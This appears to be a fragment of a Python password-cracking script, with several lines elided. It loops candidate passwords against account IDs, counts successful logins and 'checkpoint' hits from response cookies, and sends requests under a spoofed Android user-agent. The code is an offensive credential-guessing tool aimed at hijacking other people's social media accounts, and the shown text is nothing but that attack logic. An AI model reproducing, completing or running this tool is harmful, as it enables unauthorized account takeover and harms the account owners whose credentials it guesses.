...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rBAZ {P}[{b}{loop}{P}/{u}{len(id)}{P}]><{P}[{H}{ok}{P}]><{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.39 Mobile Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
